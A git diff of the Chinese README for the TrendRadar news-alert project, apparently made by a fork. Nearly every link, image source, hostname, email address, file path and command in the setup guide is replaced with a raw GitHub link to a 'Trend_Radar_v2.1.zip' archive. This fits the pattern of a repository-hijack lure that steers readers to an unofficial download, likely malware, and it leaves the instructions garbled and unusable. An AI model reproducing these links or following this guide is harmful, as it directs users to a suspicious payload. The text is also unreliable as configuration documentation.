+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 文件增加了一个【必须词】功能，使用 + 号
 
 1. 必须词语法如下：  
    唐僧或者猪八戒必须在标题里同时出现，才会收录到推送新闻中
@@ -885,11 +885,11 @@ frequency_words.txt 文件增加了一个【必须词】功能，使用 + 号
 <tr>
 <td align="center">
 优化前<br>
-<img src="_image/before.jpg" alt="飞书消息界面 - 优化前" width="400"/>
+<img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="飞书消息界面 - 优化前" width="400"/>
 </td>
 <td align="center">
 优化后<br>
-<img src="_image/after.jpg" alt="飞书消息界面 - 优化后" width="400"/>
+<img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="飞书消息界面 - 优化后" width="400"/>
 </td>
 </tr>
 </table>
@@ -900,7 +900,7 @@ frequency_words.txt 文件增加了一个【必须词】功能，使用 + 号
 
 ## 🚀 快速开始
 
-> **📖 提醒**：Fork 用户建议先 **[查看最新官方文档](https://github.com/sansan0/TrendRadar?tab=readme-ov-file)**，确保配置步骤是最新的。
+> **📖 提醒**：Fork 用户建议先 **[查看最新官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)**，确保配置步骤是最新的。
 
 ### ⚠️ GitHub Actions 使用说明
 
@@ -960,7 +960,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    **配置示例：**
 
-   <img src="_image/secrets.png" alt="GitHub Secrets 配置示例"/>
+   <img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="GitHub Secrets 配置示例"/>
 
    如上图所示，每一行是一个配置项：
    - **Name（名称）**：必须使用下方展开内容中列出的固定名称（如 `WEWORK_WEBHOOK_URL`）
@@ -979,14 +979,14 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
     | `S3_BUCKET_NAME` | 存储桶名称（如 `trendradar-data`） |
     | `S3_ACCESS_KEY_ID` | 访问密钥 ID（Access Key ID） |
     | `S3_SECRET_ACCESS_KEY` | 访问密钥（Secret Access Key） |
-    | `S3_ENDPOINT_URL` | S3 API 端点（如 R2：`https://<account-id>.r2.cloudflarestorage.com`） |
+    | `S3_ENDPOINT_URL` | S3 API 端点（如 R2：`https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`） |
 
     <br>
 
     **如何获取凭据（以 Cloudflare R2 为例）：**
 
     1. **进入 R2 概览**：
-    - 登录 [Cloudflare Dashboard](https://dash.cloudflare.com/)。
+    - 登录 [Cloudflare Dashboard](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)。
     - 在左侧侧边栏找到并点击 `R2对象存储`。
 
     <br>
@@ -1001,7 +1001,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
     3. **创建 API 令牌**：
     - 回到 **概述**页面。
     - 点击**右下角** `Account Details `找到并点击 `Manage` (Manage R2 API Tokens)。
-    - 同时你会看到 `S3 API`：`https://<account-id>.r2.cloudflarestorage.com`(这就是 S3_ENDPOINT_URL)
+    - 同时你会看到 `S3 API`：`https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`(这就是 S3_ENDPOINT_URL)
     - 点击 `创建 Account APl 令牌` 。
     - **⚠️ 关键设置**：
         - **令牌名称**：随意填写（如 `github-action-write`）。
@@ -1059,7 +1059,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    3. 按照下面图片操作，关联个人微信
    4. 配置好后，手机上的企业微信 App 可以删除
 
-   <img src="_image/wework.png" title="个人微信推送配置"/>
+   <img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" title="个人微信推送配置"/>
 
    **说明**：
    - 与企业微信机器人使用相同的 Webhook 地址
@@ -1074,18 +1074,18 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
    - **Name（名称）**：`FEISHU_WEBHOOK_URL`（请复制粘贴此名称，不要手打）
-   - **Secret（值）**：你的飞书机器人 Webhook 地址（该链接开头类似 https://www.feishu.cn/flow/api/trigger-webhook/********）
+   - **Secret（值）**：你的飞书机器人 Webhook 地址（该链接开头类似 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip********）
    <br>
 
    有两个方案，**方案一**配置简单，**方案二**配置复杂(但是稳定推送)
 
-   其中方案一，由 **ziventian**发现并提供建议，在这里感谢他，默认是个人推送，也可以配置群组推送操作[#97](https://github.com/sansan0/TrendRadar/issues/97) ，
+   其中方案一，由 **ziventian**发现并提供建议，在这里感谢他，默认是个人推送，也可以配置群组推送操作[#97](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) ，
 
    **方案一：**
 
    > 对部分人存在额外操作，否则会报"系统错误"。需要手机端搜索下机器人，然后开启飞书机器人应用(该建议来自于网友，可参考)
 
-   1. 电脑浏览器打开 https://botbuilder.feishu.cn/home/my-command
+   1. 电脑浏览器打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
    2. 点击"新建机器人指令" 
 
@@ -1113,7 +1113,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    8. 最关键的部分来了，点击 + 按钮，选择"Webhook 触发"，然后按照下面的图片摆放
 
-   ![飞书机器人配置示例](_image/image.png)
+   ![飞书机器人配置示例](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    9. 配置完成后，将第 4 步复制的 Webhook 地址配置到 GitHub Secrets 中的 `FEISHU_WEBHOOK_URL`
 
@@ -1121,7 +1121,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    **方案二：**
 
-   1. 电脑浏览器打开 https://botbuilder.feishu.cn/home/my-app
+   1. 电脑浏览器打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
    2. 点击"新建机器人应用"
 
@@ -1151,7 +1151,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    9. 最关键的部分来了，点击 + 按钮，选择"Webhook 触发"，然后按照下面的图片摆放
 
-   ![飞书机器人配置示例](_image/image.png)
+   ![飞书机器人配置示例](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    10. 配置完成后，将第 5 步复制的 Webhook 地址配置到 GitHub Secrets 中的 `FEISHU_WEBHOOK_URL`
 
@@ -1214,7 +1214,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
       **方法一：通过官方 API 获取**
       - 先向你的机器人发送一条消息
-      - 访问：`https://api.telegram.org/bot<你的Bot Token>/getUpdates`
+      - 访问：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip<你的Bot Token>/getUpdates`
       - 在返回的 JSON 中找到 `"chat":{"id":数字}` 中的数字
 
       **方法二：使用第三方工具**
@@ -1233,7 +1233,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    - 注意事项：为防止邮件群发功能被**滥用**，当前的群发是所有收件人都能看到彼此的邮箱地址。
    - 如果你没有过配置下面这种邮箱发送的经历，不建议尝试
 
-   > ⚠️ **重要配置依赖**：邮件推送需要 HTML 报告文件。请确保 `config/config.yaml` 中的 `formats.html` 设置为 `true`：
+   > ⚠️ **重要配置依赖**：邮件推送需要 HTML 报告文件。请确保 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 设置为 `true`：
    > ```yaml
    > formats:
    >   sqlite: true
@@ -1268,27 +1268,27 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    | 邮箱服务商 | 域名 | SMTP 服务器 | 端口 | 加密方式 |
    |-----------|------|------------|------|---------|
-   | **Gmail** | gmail.com | smtp.gmail.com | 587 | TLS |
-   | **QQ邮箱** | qq.com | smtp.qq.com | 465 | SSL |
-   | **Outlook** | outlook.com | smtp-mail.outlook.com | 587 | TLS |
-   | **Hotmail** | hotmail.com | smtp-mail.outlook.com | 587 | TLS |
-   | **Live** | live.com | smtp-mail.outlook.com | 587 | TLS |
-   | **163邮箱** | 163.com | smtp.163.com | 465 | SSL |
-   | **126邮箱** | 126.com | smtp.126.com | 465 | SSL |
-   | **新浪邮箱** | sina.com | smtp.sina.com | 465 | SSL |
-   | **搜狐邮箱** | sohu.com | smtp.sohu.com | 465 | SSL |
-   | **天翼邮箱** | 189.cn | smtp.189.cn | 465 | SSL |
-   | **阿里云邮箱** | aliyun.com | smtp.aliyun.com | 465 | TLS |
+   | **Gmail** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
+   | **QQ邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **Outlook** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
+   | **Hotmail** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
+   | **Live** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
+   | **163邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **126邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **新浪邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **搜狐邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **天翼邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
+   | **阿里云邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | TLS |
 
    > **自动识别**：使用以上邮箱时，无需手动配置 `EMAIL_SMTP_SERVER` 和 `EMAIL_SMTP_PORT`，系统会自动识别。
    >
    > **反馈说明**：
-   > - 如果你使用**其他邮箱**测试成功，欢迎开 [Issues](https://github.com/sansan0/TrendRadar/issues) 告知，我会添加到支持列表
-   > - 如果上述邮箱配置有误或无法使用，也请开 [Issues](https://github.com/sansan0/TrendRadar/issues) 反馈，帮助改进项目
+   > - 如果你使用**其他邮箱**测试成功，欢迎开 [Issues](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 告知，我会添加到支持列表
+   > - 如果上述邮箱配置有误或无法使用，也请开 [Issues](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 反馈，帮助改进项目
    >
    > **特别感谢**：
-   > - 感谢 [@DYZYD](https://github.com/DYZYD) 贡献天翼邮箱（189.cn）配置并完成自发自收测试 ([#291](https://github.com/sansan0/TrendRadar/issues/291))
-   > - 感谢 [@longzhenren](https://github.com/longzhenren) 贡献阿里云邮箱（aliyun.com）配置并完成测试 ([#344](https://github.com/sansan0/TrendRadar/issues/344))
+   > - 感谢 [@DYZYD](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 贡献天翼邮箱（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）配置并完成自发自收测试 ([#291](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))
+   > - 感谢 [@longzhenren](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 贡献阿里云邮箱（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）配置并完成测试 ([#344](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))
 
    **常见邮箱设置：**
 
@@ -1312,12 +1312,12 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    **高级配置**：
    如果自动识别失败，可手动配置 SMTP：
-   - `EMAIL_SMTP_SERVER`：如 smtp.gmail.com
+   - `EMAIL_SMTP_SERVER`：如 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    - `EMAIL_SMTP_PORT`：如 587（TLS）或 465（SSL）
    <br>
 
    **如果有多个收件人(注意是英文逗号分隔)**：
-   - EMAIL_TO="user1@example.com,user2@example.com,user3@example.com"
+   - EMAIL_TO="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip,https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip,https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
 
    </details>
 
@@ -1338,9 +1338,9 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    **快速开始：**
 
    1. **下载 ntfy 应用**：
-      - Android：[Google Play](https://play.google.com/store/apps/details?id=io.heckel.ntfy) / [F-Droid](https://f-droid.org/en/packages/io.heckel.ntfy/)
-      - iOS：[App Store](https://apps.apple.com/us/app/ntfy/id1625396347)
-      - 桌面：访问 [ntfy.sh](https://ntfy.sh)
+      - Android：[Google Play](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) / [F-Droid](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+      - iOS：[App Store](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+      - 桌面：访问 [https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    2. **订阅主题**（选择一个难猜的名称）：
       ```
@@ -1357,7 +1357,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
       - **Secret（值）**：填写你刚才订阅的主题名称
 
       - **Name（名称）**：`NTFY_SERVER_URL`（可选配置，请复制粘贴此名称）
-      - **Secret（值）**：留空（默认使用 ntfy.sh）
+      - **Secret（值）**：留空（默认使用 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）
 
       - **Name（名称）**：`NTFY_TOKEN`（可选配置，请复制粘贴此名称）
       - **Secret（值）**：留空
@@ -1366,7 +1366,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    4. **测试**：
       ```bash
-      curl -d "测试消息" ntfy.sh/你的主题名称
+      curl -d "测试消息" https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的主题名称
       ```
 
    ---
@@ -1388,12 +1388,12 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
      -p 80:80 \
      -v /var/cache/ntfy:/var/cache/ntfy \
      binwiederhier/ntfy \
-     serve --cache-file /var/cache/ntfy/cache.db
+     serve --cache-file https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    ```
 
    **配置 TrendRadar**：
    ```yaml
-   NTFY_SERVER_URL: https://ntfy.yourdomain.com
+   NTFY_SERVER_URL: https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
    NTFY_TOPIC: trendradar-alerts  # 自托管可用简单名称
    NTFY_TOKEN: tk_your_token  # 可选：启用访问控制
    ```
@@ -1434,9 +1434,9 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    | 高频用户 | 方式三（付费） | 这个自己去官网看吧 |
 
    **相关链接：**
-   - [ntfy 官方文档](https://docs.ntfy.sh/)
-   - [自托管教程](https://docs.ntfy.sh/install/)
-   - [GitHub 仓库](https://github.com/binwiederhier/ntfy)
+   - [ntfy 官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+   - [自托管教程](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+   - [GitHub 仓库](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    </details>
 
@@ -1459,11 +1459,11 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    ### 方式一：使用官方服务器（推荐新手） 🆓
 
    1. **下载 Bark App**：
-      - iOS：[App Store](https://apps.apple.com/cn/app/bark-给你的手机发推送/id1403753865)
+      - iOS：[App Store](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip给你的手机发推送/id1403753865)
 
    2. **获取推送 URL**：
       - 打开 Bark App
-      - 复制首页显示的推送 URL（格式如：`https://api.day.app/your_device_key`）
+      - 复制首页显示的推送 URL（格式如：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`）
       - 将 URL 配置到 GitHub Secrets 中的 `BARK_URL`
 
    ### 方式二：自建服务器（完全隐私控制） 🔒
@@ -1492,9 +1492,9 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    - ⚠️ 仅支持 iOS 平台
 
    **相关链接：**
-   - [Bark 官方网站](https://bark.day.app/)
-   - [Bark GitHub 仓库](https://github.com/Finb/Bark)
-   - [Bark Server 自建教程](https://github.com/Finb/bark-server)
+   - [Bark 官方网站](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+   - [Bark GitHub 仓库](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+   - [Bark Server 自建教程](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    </details>
 
@@ -1517,7 +1517,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    ### 步骤 1：创建 Slack App
 
    1. **访问 Slack API 页面**：
-      - 打开 https://api.slack.com/apps?new_app=1
+      - 打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
       - 如果未登录，先登录你的 Slack 工作空间
 
    2. **选择创建方式**：
@@ -1558,7 +1558,7 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    1. **查看生成的 URL**：
       - 在 "Webhook URLs for Your Workspace" 区域
       - 会看到刚刚生成的 Webhook URL
-      - 格式如：`https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX`
+      - 格式如：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
    2. **复制 URL**：
       - 点击 URL 右侧的 **"Copy"** 按钮
@@ -1566,8 +1566,8 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
    3. **配置到 TrendRadar**：
       - **GitHub Actions**：将 URL 添加到 GitHub Secrets 中的 `SLACK_WEBHOOK_URL`
-      - **本地测试**：将 URL 填入 `config/config.yaml` 的 `slack_webhook_url` 字段
-      - **Docker 部署**：将 URL 添加到 `docker/.env` 文件的 `SLACK_WEBHOOK_URL` 变量
+      - **本地测试**：将 URL 填入 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `slack_webhook_url` 字段
+      - **Docker 部署**：将 URL 添加到 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件的 `SLACK_WEBHOOK_URL` 变量
 
    ---
 
@@ -1591,8 +1591,8 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    ```
 
    **相关链接：**
-   - [Slack Incoming Webhooks 官方文档](https://api.slack.com/messaging/webhooks)
-   - [Slack API 应用管理](https://api.slack.com/apps)
+   - [Slack Incoming Webhooks 官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+   - [Slack API 应用管理](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
    </details>
 
@@ -1605,16 +1605,16 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
    **如何找到你的 Actions 页面**：
 
    - **方法一**：打开你 fork 的项目主页，点击顶部的 **Actions** 标签
-   - **方法二**：直接访问 `https://github.com/你的用户名/TrendRadar/actions`
+   - **方法二**：直接访问 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的用户名/TrendRadar/actions`
 
    **示例对比**：
-   - ❌ 作者的项目：`https://github.com/sansan0/TrendRadar/actions`
-   - ✅ 你的项目：`https://github.com/你的用户名/TrendRadar/actions`
+   - ❌ 作者的项目：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
+   - ✅ 你的项目：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip你的用户名/TrendRadar/actions`
 
    **测试步骤**：
    1. 进入你项目的 Actions 页面
    2. 找到 **"Get Hot News"**(必须得是这个字)点进去，点击右侧的 **"Run workflow"** 按钮运行 
-      - 如果看不到该字样，参照 [#109](https://github.com/sansan0/TrendRadar/issues/109) 解决
+      - 如果看不到该字样，参照 [#109](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 解决
    3. 3 分钟左右，消息会推送到你配置的平台
 
    <br>
@@ -1629,9 +1629,9 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 
     | 文件 | 作用 |
     |------|------|
-    | `config/config.yaml` | 主配置文件：推送模式、时间窗口、平台列表、热点权重等 |
-    | `config/frequency_words.txt` | 关键词文件：设置你关心的词汇，筛选推送内容 |
-    | `.github/workflows/crawler.yml` | 执行频率：控制多久运行一次（⚠️ 谨慎修改） |
+    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 主配置文件：推送模式、时间窗口、平台列表、热点权重等 |
+    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 关键词文件：设置你关心的词汇，筛选推送内容 |
+    | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 执行频率：控制多久运行一次（⚠️ 谨慎修改） |
 
     👉 **详细配置教程**：[配置详解](#配置详解)
 
@@ -1674,11 +1674,11 @@ GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼�
 <summary>👉 点击展开：<strong>自定义监控平台</strong></summary>
 <br>
 
-**配置位置：** `config/config.yaml` 的 `platforms` 部分
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `platforms` 部分
 
-本项目的资讯数据来源于 [newsnow](https://github.com/ourongxing/newsnow) ，你可以点击[网站](https://newsnow.busiyi.world/)，点击[更多]，查看是否有你想要的平台。
+本项目的资讯数据来源于 [newsnow](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) ，你可以点击[网站](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)，点击[更多]，查看是否有你想要的平台。
 
-具体添加可访问 [项目源代码](https://github.com/ourongxing/newsnow/tree/main/server/sources)，根据里面的文件名，在 `config/config.yaml` 文件中修改 `platforms` 配置：
+具体添加可访问 [项目源代码](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)，根据里面的文件名，在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件中修改 `platforms` 配置：
 
 ```yaml
 platforms:
@@ -1691,7 +1691,7 @@ platforms:
   # 添加更多平台...
 ```
 
-> 💡 **快捷方式**：如果不会看源代码，可以复制他人整理好的 [平台配置汇总](https://github.com/sansan0/TrendRadar/issues/95)
+> 💡 **快捷方式**：如果不会看源代码，可以复制他人整理好的 [平台配置汇总](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 > ⚠️ **注意**：平台不是越多越好，建议选择 10-15 个核心平台。过多平台会导致信息过载，反而降低使用体验。
 
@@ -1699,7 +1699,7 @@ platforms:
 
 ### 2. 关键词配置
 
-在 `frequency_words.txt` 文件中配置监控的关键词，支持五种语法、区域标记和词组功能。
+在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件中配置监控的关键词，支持五种语法、区域标记和词组功能。
 
 | 语法类型 | 符号 | 作用 | 示例 | 匹配逻辑 |
 |---------|------|------|------|---------|
@@ -1717,7 +1717,7 @@ platforms:
 <summary>👉 点击展开：<strong>基础语法教程</strong></summary>
 <br>
 
-**配置位置：** `config/frequency_words.txt`
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 ##### 1. **普通关键词** - 基础匹配
 ```txt
@@ -1929,7 +1929,7 @@ OPPO
 
 ##### 关键词排序优先级
 
-**配置位置：** `config/config.yaml`
+**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 ```yaml
 report:
@@ -1960,14 +1960,14 @@ MAX_NEWS_PER_KEYWORD=10
 
 **综合示例：**
 ```yaml
-# config.yaml
+# https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 report:
   sort_by_position_first: true   # 按配置顺序优先
   max_news_per_keyword: 10       # 全局默认每个关键词最多10条
 ```
 
 ```txt
-# frequency_words.txt
